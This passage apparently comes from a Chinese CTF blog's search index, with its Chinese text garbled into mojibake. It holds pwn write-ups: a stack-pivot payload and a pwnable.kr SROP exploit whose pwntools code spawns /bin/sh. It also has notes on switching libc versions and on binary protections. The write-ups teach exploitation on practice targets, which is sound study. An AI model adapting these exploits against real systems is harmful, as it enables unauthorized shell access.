ebpï¼Œå°†æ ˆé¡¶æŒ‡å‘ebpæŒ‡å‘çš„å†…å®¹ï¼Œæ­¤æ—¶ebpå·²ç»è¢«ä¿®æ”¹æˆäº†payload3ï¼Œè€Œpayload3ä¼šè¢«èµ‹å€¼æˆInput_addrï¼Œä¹Ÿå°±æ˜¯espä¼šæŒ‡å‘input_addrã€‚\n\nâ‘¡æ‰§è¡Œleaveç¬¬äºŒæ­¥æ±‡ç¼–æŒ‡ä»¤pop ebpï¼Œå°†å½“å‰æ ˆé¡¶çš„å€¼èµ‹å€¼ç»™ebpï¼Œä¹Ÿå°±æ˜¯ebpçš„å€¼ä¼šå˜æˆpayload1ï¼Œ(è¿™é‡Œçš„payload1æ²¡ä»€ä¹ˆä½œç”¨ï¼Œå¯ä»¥éšä¾¿å¡«)ä¹‹åespç”±äºpopï¼Œesp+0x4ï¼Œä¼šå¾€æ ˆåº•ç§»åŠ¨ä¸€ä¸ªåœ°å€ï¼Œç§»åŠ¨åˆ°æŒ‡å‘æˆ‘ä»¬è¾“å…¥çš„payload2å¤„ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548823.png)\n\nâ‘£ä¹‹åretnæ‰§è¡Œï¼Œå®é™…æŒ‡ä»¤ä¸ºpop eipï¼Œä¹Ÿå°±æ˜¯å°†å½“å‰æ ˆé¡¶æ•°æ®ç»™eipï¼Œä¹Ÿå°±æ˜¯eipè¢«èµ‹å€¼ä¸ºæˆ‘ä»¬payloadä¸­çš„payload2ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548769.png)\n\nâ‘¤æœ€åæ‰§è¡Œretnçš„ç¬¬äºŒæ¡å®é™…æŒ‡ä»¤ï¼šjmp eipï¼Œæ­¤æ—¶eipå°±å·²ç»æ˜¯payload2çš„å€¼ï¼Œæ‰€ä»¥å°†è¯¥payload2è®¾ç½®ä¸ºcorrectå‡½æ•°åœ°å€æˆ–è€…æ˜¯system(\"/bin/sh\");å°±å¯ä»¥getshellã€‚\n\næ€»çš„æ¥è¯´ï¼Œå°±æ˜¯åˆ©ç”¨leaveå’Œretnä¸¤ä¸ªæ“ä½œæ¥åŠ«æŒeipçš„å€¼ï¼Œä½¿å…¶ç›´æ¥æŒ‡å‘åé—¨å‡½æ•°ï¼Œä¸€æ­¥getshellã€‚\n\n5.åˆ›å»ºpayloadï¼Œç»„æˆåº”è¯¥æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#é¦–å…ˆç¡®å®šåœ°å€ï¼š\ncorrect_addr = 0x08049278\ninput_addr = 0x0811eb40\n```\n\nä¹‹åç¡®å®špayloadçš„ç»„æˆï¼š\n\npayload = padding + eip + input_addrã€‚\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"aaaa\"\t\t\t\t#padding\npayload += p32(0x08049284)\t\t\n#system(\"/bin/sh\")åœ°å€ï¼Œæ•´ä¸ªpayloadè¢«å¤åˆ¶åˆ°bssä¸Šï¼Œæ ˆåŠ«æŒåretnæ—¶æ ˆé¡¶åœ¨è¿™é‡Œ\npayload += p32(0x0811eb40)\t\t#æ–°çš„eipåœ°å€\n```\n\næœ€åå¾—æ³¨æ„å‘é€çš„æ˜¯base64ç¼–ç ä¹‹åçš„payloadã€‚\n\n \n\nå‚è€ƒèµ„æ–™:\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["hijackStack"],"categories":["PWN","hijackStack0x4"]},{"title":"pwnable.kr-unexploitable","url":"/2021/08/14/pwnable.kr-unexploitable/","content":"\n1.å¸¸è§„checksecï¼Œåªå¼€å¯äº†NXã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œç¨‹åºå¾ˆç®€å•ï¼Œè¯»å…¥æ•°æ®æ ˆæº¢å‡ºï¼Œå¯ä»¥è¯»å–1295ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯bufåªæœ‰0x10hå¤§å°ï¼Œæ‰€ä»¥å¯ä»¥æº¢å‡ºè¶³å¤Ÿé•¿çš„æ•°æ®ã€‚\n\n2.ç¨‹åºæ²¡æœ‰åé—¨ï¼Œæ²¡æœ‰å¯¼å…¥systemå‡½æ•°ï¼Œæ²¡æœ‰binshå­—ç¬¦ä¸²ï¼Œä¹Ÿæ²¡æœ‰writeã€putã€printfä¹‹ç±»çš„å¯ä»¥æ³„éœ²libcçš„å‡½æ•°ï¼Œæ²¡åŠæ³•ROPï¼Œç„¶åROPgadgetä¹Ÿæœä¸åˆ°syscallã€‚è¿™é‡Œæ¢ç”¨å¦ä¸€ç§å·¥å…·ropperæ¥æœç´¢ï¼šropper --file=unexploitable --search \"syscall\"ï¼Œå¯ä»¥æœåˆ°ä¸€ä¸ªã€‚æœ‰äº†syscallï¼Œå¯ä»¥å°è¯•ç”¨ropæ¥ç»™å¯„å­˜å™¨èµ‹å€¼ç„¶åå¼€shellï¼Œä½†æ˜¯è¿™é‡Œè¿˜æ˜¯æœä¸åˆ°ç»™rsiï¼Œrdiç­‰å¯„å­˜å™¨èµ‹å€¼çš„gadgetï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬ä¹Ÿæ²¡åŠæ³•ç›´æ¥é€šè¿‡ROPå®ç°getshellã€‚\n\n3.å¦‚æœæ²¡æœ‰å¼€NXï¼Œç›´æ¥æ ˆåŠ«æŒç„¶åshellcodeå°±å®Œäº‹äº†ï¼Œä½†æ˜¯å¼€å¯äº†NXï¼Œæ²¡åŠæ³•shellcodeã€‚\n\n4.å•¥ä¹Ÿä¸ç®¡ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨SROPï¼Œä¹Ÿå°±æ˜¯é€šè¿‡syscallå†åˆ©ç”¨SigreturnFrameæ¥è®¾ç½®å¯„å­˜å™¨rsiå’Œridçš„å€¼ï¼ŒåŠ ä¸Šå­—ç¬¦ä¸²binshå¯ä»¥ç›´æ¥getshellï¼Œä¸ç”¨éå¾—è®¾ç½®rsi,rdiå¯„å­˜å™¨å€¼çš„ropã€‚ä½†æ˜¯è¿™é‡Œä½¿ç”¨SigreturnFrameæœ‰é™åˆ¶ï¼Œéœ€è¦æº¢å‡ºçš„é•¿åº¦è¾ƒé•¿ä¸€äº›ï¼Œ32ä½ä¸‹éœ€è¦ä¾é¡ºåºå¸ƒç½®æ ˆï¼Œ64ä½æ¡ä»¶ä¸‹éœ€è¦å¾€æ ˆä¸­å¸ƒç½®ä¸€ä¸ªç»“æ„ä½“ï¼Œæ‰€ä»¥éœ€è¦è¾“å…¥è¶³å¤Ÿé•¿çš„payloadæ¥ä¿®æ”¹ã€‚\n\n5.è¿™é‡Œä½¿ç”¨çš„æ–¹æ¡ˆæ˜¯SigreturnFrameï¼Œå…ˆè€ƒè™‘ä¸€æ®µè¶³å¤Ÿé•¿çš„å¯ä¿®æ”¹çš„å†…å­˜åœ°å€æ¥ç»™æˆ‘ä»¬å­˜æ”¾æ ˆåŠ«æŒçš„å†…å®¹ã€‚ä½†æ˜¯åœ¨IDAä¸­æŒ‰ctrl+sæŸ¥çœ‹å†…å­˜æ®µï¼Œå‘ç°æ‰€æœ‰çš„å¯æ”¹å¯è¯»çš„å†…å­˜æ®µéƒ½ç‰¹åˆ«å°ï¼Œæ²¡åŠæ³•å­˜æ”¾è¶³å¤Ÿé•¿çš„æº¢å‡ºå†…å®¹ã€‚è¿™é‡Œå¿½ç•¥äº†ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œä¸´æ—¶åˆ›å»ºçš„ç¼“å­˜ï¼šä¹Ÿå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨read(0, &buf, 0x50FuLL);æ—¶ï¼Œä¼šä¸´æ—¶åˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸º0x50Fçš„ç¼“å­˜åŒºé—´ï¼Œè¿™ä¸ªåŒºé—´è¶³å¤Ÿæ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œä½†æ˜¯åœ¨IDAä¸­æ‰¾ä¸åˆ°ï¼Œé‚£å°±æ²¡åŠæ³•æ ˆåŠ«æŒåˆ°è¿™ä¸ªä½ç½®ã€‚è¿™é‡Œå¯ä»¥å…ˆåŠ¨æ€è°ƒè¯•ä¸€ä¸‹ï¼Œç”±äºæ²¡æœ‰å¼€å¯PIEï¼Œç¨‹åºåŠ è½½åçš„åŸºåœ°å€æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æ— è®ºç¨‹åºåŠ è½½å¤šå°‘æ¬¡ï¼Œåœ°å€ä»ç„¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚é‚£ä¹ˆè½¬å‘åŠ¨æ€è°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°ç¨‹åºå†’å‡ºæ¥ä¸€ä¸ªå¯è¯»å¯å†™çš„å†…å­˜æ®µï¼šunexploitableï¼Œè¿™ä¸ªå°±æ˜¯ä¸´æ—¶åˆ›å»ºçš„ä¸€ä¸ªç¼“å­˜åŒºé—´ï¼Œé•¿åº¦ä¸ºF88ï¼Œè¶³å¤Ÿç”¨æ¥æ‰§è¡Œæ“ä½œã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191526527.png)\n\n6.åœ¨è¿™ä¸ªåŒºé—´ä¸Šä»»æ„é€‰å–ä¸€ä¸ªåœ°å€æ¥æ ˆåŠ«æŒï¼Œè¿™é‡Œé€‰æ‹©0x60116cï¼Œç„¶åç¼–å†™payloadï¼Œå°è¯•èƒ½å¦æˆåŠŸæ ˆåŠ«æŒå¹¶ä¸”è¯»å…¥binshï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += 'a'*16               #padding\npayload += p64(fake_stack_addr)\n#mainå‡½æ•°è¿”å›æ—¶ï¼Œå°†æ ˆåŠ«æŒåˆ°fake_stack_addrå¤„ï¼Œç¬¬ä¸€æ¬¡å°†ä½¿å¾—rbpå˜ä¸ºfake_stack_addr, rbp + bufä¸ºfake_stack_addr - 0x10\npayload += p64(set_read_addr)   \n#æ±‡ç¼–æŒ‡ä»¤ä¸ºlea rax, [rbp+buf]; mov edx, 50Fh; mov rsi, rax; mov edi, 0; mov eax, 0; call _readçš„åœ°å€å¤„\nio.send(payload)\n```\n\nè¿™æ ·æ¥ä¸‹æ¥å¦‚æœå†è¾“å…¥binshå­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥è¯»å–åˆ°[rbp+buf]å¤„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„set_read_addræ˜¯ä»ä¸‹å›¾æœ€å¼€å§‹è·³è½¬ï¼Œå¦‚æœç›´æ¥è·³è½¬call readï¼Œé‚£ä¹ˆå°±ä¼šç”±äºreadå–å‚æ˜¯edx,rsi,ediï¼Œä»è€Œå¯¼è‡´æ•°æ®ä¼šå­˜å…¥rsiæŒ‡å‘çš„åœ°å€ï¼Œæ²¡åŠæ³•å­˜åˆ°æˆ‘ä»¬åŠ«æŒçš„æ ˆä¸­ã€‚è§‚å¯Ÿreadå‡½æ•°æ±‡ç¼–ä»£ç å¯ä»¥çŸ¥é“ï¼Œè™½ç„¶readå­˜å…¥çš„åœ°å€æ˜¯rsiï¼Œä½†æ˜¯rsiæ˜¯é€šè¿‡rbp+bufæ¥èµ‹å€¼çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹rbpä¸ºfake_stackï¼Œä½¿å¾—rbp+bufçš„åœ°å€å˜ä¸ºfake_stackä¸Šçš„æŸä¸ªåœ°å€ï¼Œå†æ‰§è¡Œä¸‹å›¾ä¸­çš„ä»£ç ï¼Œå°±å¯ä»¥ä½¿å¾—readè¯»å–çš„å†…å®¹ç›´æ¥è¿›å…¥åˆ°åŠ«æŒæ ˆrbp+bufä¸Šï¼Œä¹Ÿå°±æ˜¯fake_stackä¸Šã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191526968.png)\n\n7.æ ˆåŠ«æŒå®Œæˆä¹‹åï¼Œè€ƒè™‘ç¬¬äºŒæ®µçš„payloadï¼Œä¹Ÿå°±æ˜¯è¾“å…¥binshå­—ç¬¦ä¸²å’Œåç»­å†…å®¹ï¼Œæ¥æ‰§è¡ŒSigreturnFrameï¼Œä½¿ç”¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += \"/bin/sh\\x00\"\n```\n\nè¾“å…¥å­—ç¬¦ä¸²binshï¼Œå­˜æ”¾åœ¨fake_stack_addr-0x10å¤„\n\n```\n#æ³¨é‡Šå¤´\n\npayload += 'a'*8 #padding\npayload += p64(fake_stack_addr+0x10)#å­˜æ”¾åœ¨0x60116cå¤„\n```\n\nè¯»å–å®Œä¹‹åï¼Œæ‰§è¡ŒleaveæŒ‡ä»¤ä¹‹å‰çš„æ ˆåº•ä¸º0x60116cï¼Œè€ŒleaveæŒ‡ä»¤ç›¸å½“äºï¼šmov rsp rbpï¼›å’Œpop rbpï¼š\n\n(1)ç¬¬ä¸€æ¡mov rsp rbpä¹‹åï¼Œ0x60116cå°±è¢«èµ‹å€¼ç»™rspï¼Œä¹Ÿå°±æ˜¯rspæŒ‡å‘0x60116cã€‚\n\n(2)ç¬¬äºŒæ¡pop rbpä¹‹åï¼ŒæŠŠ0x60116cå¤„çš„å†…å®¹èµ‹å€¼ç»™rbpï¼Œè¿™é‡Œè®¾ç½®0x60116cå¤„çš„å†…å®¹ä¸ºfake_stack_addr+0x10ï¼Œä¹Ÿå°±æ˜¯0x60117cï¼Œé‚£ä¹ˆrbpæŒ‡å‘0x60117cã€‚rspä¸‹æŒªä¸€ä¸ªå•ä½ï¼ŒæŒ‡å‘0x60116c+0x08=0x601174ã€‚\n\næ•…leaveæŒ‡ä»¤æ‰§è¡Œå®Œårsp = 0x601174ï¼Œrbp = 0x60117cã€‚\n\nâ–²è¿™é‡Œè¿™ä¹ˆè®¾ç½®æ˜¯æœ‰åŸå› çš„ï¼Œä¸ºäº†æŒªåŠ¨rspæ¥æŒ‡å‘0x601174ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\npayload += p64(call_read_addr)#å­˜æ”¾åœ¨0x601174\n#å­˜æ”¾åœ¨0x601174å¤„ï¼Œä¸ºäº†ä¹‹åå†æ¬¡è°ƒç”¨readä¿®æ”¹raxã€‚\n```\n\næ¥ç€æ‰§è¡ŒretnæŒ‡ä»¤ï¼Œç›¸å½“äºpop eipï¼Œæ­¤æ—¶çš„rspæŒ‡å‘ 0x601174ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†0x601174å¤„çš„å€¼å˜ä¸ºread_addrçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¿™æ¡è¯­å¥ï¼Œè¿™é‡Œè®¾ç½®read_addrä¸º0x400571ï¼Œä¹Ÿå°±æ˜¯å¸¦æœ‰callæŒ‡ä»¤çš„readã€‚\n\n```\næ³¨é‡Šå¤´\n\npayload += p64(fake_stack_addr)#å­˜æ”¾åœ¨0x60117cï¼Œè¿™é‡Œå¯ä»¥éšä¾¿è®¾ç½®ï¼Œç”¨ä¸åˆ°\n```\n\nretnæŒ‡ä»¤ä¹‹åå°±æ˜¯callæŒ‡ä»¤ï¼Œå„ç§å¯„å­˜å™¨çš„å€¼è¿˜æ˜¯æ²¡å˜ï¼Œæ‰€ä»¥ç…§å¸¸ç”¨å°±è¡Œï¼Œå›æ¥ä¹‹årspä»æ—§æŒ‡å‘0x60117cã€‚æ­¤æ—¶æ ˆçŠ¶æ€ä¸ºï¼š\n\nrsp = 0x60117cï¼Œrbp = 0x60117cã€‚\n\n```\n#æ³¨é‡Šå¤´\n\npayload += str(frameExecve)#è®¾ç½®SigreturnFrameç»“æ„ä½“\n\nio.send(payload)\n#set_readå¤„çš„è¯»å–\n\nsleep(3)\n\n\nio.send('/bin/sh\\x00' + ('a')*7) \n#call_readå¤„çš„è¯»å–ã€‚\n```\n\nè¯»å–15ä¸ªå­—ç¬¦åˆ°0x60115cï¼Œç›®çš„æ˜¯åˆ©ç”¨readè¿”å›å€¼ä¸ºè¯»å–çš„å­—èŠ‚æ•°çš„ç‰¹æ€§è®¾ç½®rax=0xfï¼Œæ³¨æ„ä¸è¦ä½¿/bin/sh\\x00å­—ç¬¦ä¸²å‘ç”Ÿæ”¹å˜ã€‚\n\næœ€åio.interactive()å³å¯getshellã€‚\n\nâ–²æ€»çš„ç¨‹åºæµåº”è¯¥æ˜¯ï¼šé¦–æ¬¡read->set_read->call_read->syscall\n\nç»“æ„ä½“çš„è®¾ç½®ï¼Œå›ºå®šæ¨¡å¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nframeExecve = SigreturnFrame() #è®¾ç½®SROP Frame\nframeExecve.rax = constants.SYS_execve\nframeExecve.rdi = binsh_addr\nframeExecve.rsi = 0\nframeExecve.rdx = 0\nframeExecve.rip = syscall_addr\n```\n\nå¼€å¤´è®¾ç½®ï¼š\n\n```\n#æ³¨é‡Šå¤´ \n\nsyscall_addr = 0x400560 \nset_read_addr = 0x40055b \nread_addr = 0x400571 \nfake_stack_addr = 0x60116c \nbinsh_addr = 0x60115c\n```\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["SROP"],"categories":["PWN","SROP0x8"]},{"title":"pwnä¸­libcç‰ˆæœ¬åˆ‡æ¢ç¼–è¯‘","url":"/2021/08/14/pwnä¸­libcç‰ˆæœ¬åˆ‡æ¢ç¼–è¯‘/","content":"\nä¸€ã€æ‰‹åŠ¨ç¼–è¯‘\n\n1.ä¸‹è½½å¯¹åº”libcçš„æºç ï¼šä»¥2.32ä¸ºä¾‹ï¼šglibc-2.32.tar.gz\n\n(1)å®˜ç½‘ï¼šhttps://ftp.gnu.org/gnu/glibc/\n\n(2)æ¸…åé•œåƒæºï¼šhttps://mirrors.tuna.tsinghua.edu.cn/gnu/glibc/\n\n2.è§£å‹ï¼Œç„¶åæ–°å»ºæ–‡ä»¶å¤¹æ¥å­˜å‚¨ç¼–è¯‘ç»“æœï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ntar -xvf glibc-2.32.tar.gz\nmkdir glibc-2.32_build\nmkdir glibc-2.32_out\n```\n\n3.ç¼–è¯‘ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ncd glibc-2.32_build\n../glibc-2.32/configure '--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes'\nmake\n```\n\nè¿™é‡Œçš„--prefix=****éœ€è¦ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œä¸èƒ½æ—¶ç›¸å¯¹è·¯å¾„ï¼Œå¯¹äºpwnæ¥è¯´å°±å¥½äº†ï¼Œä¸ç”¨å†æ¥ç€å¾€ä¸‹å®‰è£…äº†ã€‚ä¸è¿‡è¿™æ˜¯64ä½çš„ï¼Œ32ä½å¾—å¦‚ä¸‹ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ncd glibc-2.32_build\nCC=\"gcc -m32\" CXX=\"g++ -m32\" \\\n../glibc-2.32/configure '--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes --host=i686-linux-gnu --build=i686-lin    ux-gnu' \nmake\n```\n\nåŸºæœ¬æ˜¯å·®ä¸å¤šçš„ã€‚\n\n4.æ‰¾libc.so å’Œ ld.soæ–‡ä»¶ï¼š\n\n(1)libc.so åœ¨glibc-2.32_buildç›®å½•ä¸‹\n(2)ld.so åœ¨glibc-2.32_build/elf ç›®å½•ä¸‹\n\n5.ä½¿ç”¨ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\np = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n```\n\nè¿™æ ·å°±å¯ä»¥gdbè°ƒè¯•çš„æ—¶å€™å¸¦ç¬¦å·è¡¨ï¼Œç„¶åè¿˜æœ‰æºç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_20-51-09.png)\n\nâ–²å…³äºld.soçš„è¿æ¥ä½¿ç”¨ï¼Œæœ€å¥½è¿˜æ˜¯ç”¨ç¼–è¯‘é…å¥—çš„ï¼Œä¸ç„¶å®¹æ˜“å‡ºé”™ã€‚å¦‚æœä¸éœ€è¦æºç ï¼Œåªéœ€è¦æŒ‰ç…§çš„libcå’Œldï¼Œå°±å¯ä»¥make installã€‚ç„¶ååœ¨glibc-2.32_out/lib/ä¸‹å°±èƒ½æ‰¾åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶äº†ã€‚\n\n \n\näºŒã€å¯¹åº”dockerä¸‹è½½ï¼š\n\n1.æœå¯¹åº”ç‰ˆæœ¬libcå¯¹åº”çš„ubuntuï¼Œæ¯”å¦‚libc-2.27å°±å¯¹åº”ubuntu18.04ï¼Œç„¶åpullä¸‹æ¥ã€‚\n\n2.ç„¶åå°†å¯¹åº”ç‰ˆæœ¬çš„dockeræºsources.listæ‹·è´è¿›å»ï¼Œç„¶åæˆ‘è¿™è¾¹è‡ªå·±æ€»ç»“äº†ä¸€ä»½å®‰è£…è„šæœ¬ï¼Œä¸€é”®è¿è¡Œï¼Œçœå»å¾ˆå¤šéº»çƒ¦ã€‚(è®°å¾—å…ˆå¤‡ä»½ä¸€ä¸‹ï¼Œé˜²æ­¢å‡ºé”™)\n\n```bash\ndocker cp sources.list [dockerName]:/etc/apt/\ndocker cp install.sh [dockerName]:/\nchmod a+x install.sh\n./install.sh\n```\n\nè£…å®Œä¹‹ååŸºæœ¬çš„ç¯å¢ƒå°±æœ‰äº†ï¼Œpwndbgï¼Œpythonï¼Œpwntoolsç­‰ç­‰ï¼Œå…¶ä»–çš„è‡ªå·±æ…¢æ…¢å®‰è£…å§ã€‚\n\nâ–²æœ‰ä¸ªpwn_dockerä¹ŸæŒºå¥½ä½¿çš„ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ndocker pull pwn_docker\n```\n\né‡Œé¢è¿è¡Œä¹Ÿç±»ä¼¼ä¸åŒç‰ˆæœ¬çš„libc:\n\n```python\n#æ³¨é‡Šå¤´ \np\np = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './pwn'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n```\n\n \n\nä¸‰ã€å·¥å…·ä½¿ç”¨ï¼šLibcSearcher\n\nè¿™ä¸ªç®—æ˜¯æœ€å¸¸ç”¨äº†ï¼Œå¾ˆå¥½ç”¨ï¼Œç›´æ¥å»githubä¸Šæ‰¾å¾ˆå¤šï¼Œå¤–é¢ä¹Ÿæœ‰å¾ˆå¤šæ•™ç¨‹ã€‚\n\n \n\nå››ã€patchelfï¼šç›´æ¥ä¿®æ”¹ELFæ–‡ä»¶åŠ è½½çš„libc\n\n1.å®‰è£…ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\nsudo apt-get install autoconf automake libtool\ngit clone https://github.com/NixOS/patchelf.git\n./bootstrap.sh\n./configure\nmake\nmake check\nsudo make install\n```\n\nç¼–è¯‘ç¯å¢ƒå•¥çš„éƒ½è¦æœ‰\n\n2.ä½¿ç”¨ï¼š\n\nhttps://github.com/NixOS/patchelf\n\n```bash\n#æ³¨é‡Šå¤´\n\npatchelf --set-interpreter /home/hacker/glibc/2.23/64/lib/ld-2.23.so --set-rpath /home/hacker/glibc/2.23/64/lib/ ./pwn\n```\n\nè¿™ä¸ªå¯ä»¥ç›´æ¥gdbè°ƒè¯•ï¼Œä¸ç”¨å†ç”¨pythonæ‰“å¼€æŒ‡å®šç¯å¢ƒã€‚\n\n \n\näº”ã€gdbæŒ‡å®šæºç çº§åˆ«è°ƒè¯•ï¼š\n\nâ–²æœ‰æ—¶å€™ç”¨Patchelfåˆ‡æ¢ä¹‹åï¼Œæƒ³è°ƒè¯•å¯¹åº”ç‰ˆæœ¬çš„glibcæºç \n\n1.gdbæ‰“å¼€åç›´æ¥å‘½ä»¤è¾“å…¥æŒ‡å®šï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ndir /home/hacker/glibc-src/glibc-2.23/malloc\n```\n\n2.gdbç¯å¢ƒé…ç½®è¾“å…¥ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\nvim ~/.gdbinit\ndir /home/hacker/glibc-src/glibc-2.23/malloc\n```\n\nä½†æ˜¯è¿™æœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœéœ€è¦å¯¹åº”ç‰ˆæœ¬åˆ™æ²¡åŠæ³•ï¼Œåªä¼šåŠ è½½åˆ°æœ€ä¸‹é¢çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥ä¸€èˆ¬patchelfä¹‹åï¼ŒæŒ‡å®šdirå³å¯ã€‚\n\n \n\n \n\n","tags":["libc"],"categories":["PWN"]},{"title":"pwnä¿æŠ¤æªæ–½","url":"/2021/08/14/pwnä¿æŠ¤æªæ–½/","content":"\nä¸€ã€RELRO: (ReLocation Read-Only)\n\n1.åŠŸèƒ½ï¼šè§£å†³å»¶è¿Ÿç»‘å®šé—®é¢˜ï¼Œå°†ç¬¦å·é‡å®šå‘è¡¨è®¾ç½®ä¸ºåªè¯»ï¼Œæˆ–è€…åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œé˜²æ­¢gotè¡¨è¢«ç¯¡æ”¹ã€‚\n\n2.è¡¨ç°å½¢å¼ï¼š\n\npwn checksecæ£€æŸ¥ä¸ºRELRO: Full RELROï¼ŒPartial RELROä¿æŠ¤\n\n3.ä¿æŠ¤ç­‰çº§ï¼š\n\n(1)Partial RELRO:\n\nâ‘ ä¸€äº›æ®µ(.dynamicã€.gotç­‰)åœ¨åˆå§‹åŒ–åä¼šè¢«æ ‡è®°åªè¯»ï¼Œ.gotæ®µä»£è¡¨æ— pltæŒ‡å‘çš„gotè¡¨ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å‘ç”Ÿå»¶è¿Ÿç»‘å®šï¼Œæ²¡æœ‰è¢«å¤–éƒ¨externå¯¼å…¥çš„å‡½æ•°è¢«æ ‡è®°ä¸ºåªè¯»ã€‚\n\nâ‘¡ä½†æ˜¯æœ‰è¢«å¤–éƒ¨externå¯¼å…¥çš„å‡½æ•°ï¼Œå‘ç”Ÿå»¶è¿Ÿç»‘å®šçš„å‡½æ•°ï¼Œåœ¨.got.pltæ®µï¼Œä»ç„¶å¯ä»¥ç¯¡æ”¹gotè¡¨ï¼Œè¿™é‡Œçš„gotè¡¨æ˜¯.got.pltæ®µã€‚\n\n(2)Full RELRO:ç›´æ¥ç¦æ­¢å»¶è¿Ÿç»‘å®šï¼Œæ— .got.pltæ®µï¼Œåªæœ‰.gotæ®µï¼Œä¸”è¢«æ ‡è®°ä¸ºåªè¯»ï¼Œæ— æ³•ä¿®æ”¹ï¼Œæ— æ³•ç¯¡æ”¹gotè¡¨ã€‚\n\n4.ç»•è¿‡æ–¹æ³•ï¼šæœ‰å•¥ç»•è¿‡æ–¹æ³•ï¼Œä¸æ”¹gotè¡¨ä¸å°±å®Œäº†ã€‚\n\n \n\n \n\näºŒã€FORTIFY_SOURCE:\n\n1.åŠŸèƒ½ï¼šå°†æ•æ„Ÿå‡½æ•°å¦‚read, fgets, memcpy, printfç­‰ç­‰æ·»åŠ ä¿æŠ¤ï¼Œæ›¿æ¢ä¸º__read_chk, __fgets_chk, __memcpy_chk, __printf_chkç­‰å‡½æ•°ã€‚è¿™äº›å¸¦äº†chkçš„å‡½æ•°ä¼šæ£€æŸ¥è¯»å–/å¤åˆ¶çš„å­—èŠ‚é•¿åº¦æ˜¯å¦è¶…è¿‡ç¼“å†²åŒºé•¿åº¦ï¼Œæ£€æŸ¥è¯¸å¦‚%nä¹‹ç±»çš„å­—ç¬¦ä¸²ä½ç½®æ˜¯å¦ä½äºå¯èƒ½è¢«ç”¨æˆ·ä¿®æ”¹çš„å¯å†™åœ°å€ï¼Œé¿å…äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å‡ºç°ã€‚ï¼ˆå¦‚ç›´æ¥%7$xï¼‰\n\n2.è¡¨ç°å½¢å¼ï¼šå¸¦æœ‰chkçš„å‡½æ•°ï¼Œchecksecå¯ä»¥æ£€æµ‹åˆ°\n\n3.ä¿æŠ¤ç­‰çº§ï¼š\n\n(1)-Ol -D_FORTIFY_SOURCE=0ï¼šå…³é—­\n\n(2)-Ol -D_FORTIFY_SOURCE=1ï¼šæ›¿æ¢getï¼Œmemecpyç­‰ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ä»ç„¶å¯ç”¨\n\n(3)-Ol -D_FORTIFY_SOURCE=2ï¼šæ 